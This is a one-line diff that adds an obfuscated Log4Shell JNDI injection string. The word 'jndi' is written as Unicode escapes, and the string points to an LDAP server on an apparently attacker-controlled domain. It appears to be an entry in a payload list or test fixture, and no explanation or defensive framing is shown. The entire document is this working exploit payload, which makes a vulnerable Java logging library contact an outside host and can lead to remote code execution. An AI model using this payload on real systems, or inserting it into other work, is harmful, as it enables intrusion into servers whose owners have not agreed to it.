@@ -1,0 +1,1 @@
+${\u006a\u006e\u0064\u0069:ldap://somesitehackerofhell.com/z}
